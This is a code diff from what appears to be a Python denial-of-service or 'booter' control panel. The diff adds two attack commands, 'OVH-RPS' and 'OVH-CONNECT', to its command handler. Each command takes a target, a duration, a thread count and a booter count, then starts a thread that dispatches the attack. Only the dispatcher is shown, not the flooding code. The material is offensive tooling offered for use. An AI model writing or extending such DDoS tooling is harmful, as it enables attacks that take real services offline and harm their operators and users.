@@ -58,6 +58,24 @@ def controler():
             threading.Thread(target=type_sender,args=('HANDSHAKE',f'{target} {times} {thread} {meths}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['HANDSHAKE']))
+        elif a =='OVH-RPS' or a == 'أوفه-آربيس' or a == 'OVHRPS':
+           if len(com) == 5:
+            target = com[1]
+            times = com[2]
+            thread = com[3]
+            booters = com[4]
+            threading.Thread(target=type_sender,args=('OVH-RPS',f'{target} {times} {thread} {booters}')).start()
+            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
+           else:print(format_banner(languages['METHODS']['OVHRPS']))
+        elif a =='OVH-CONNECT' or a == 'OVH-الاتصال' or a == 'OVHCONNECT':
+           if len(com) == 5:
+            target = com[1]
+            times = com[2]
+            thread = com[3]
+            booters = com[4]
+            threading.Thread(target=type_sender,args=('OVH-CONNECT',f'{target} {times} {thread} {booters}')).start()
+            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
+           else:print(format_banner(languages['METHODS']['OVHCONNECT']))
         elif a == 'MENU':
            clear_console()
            print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
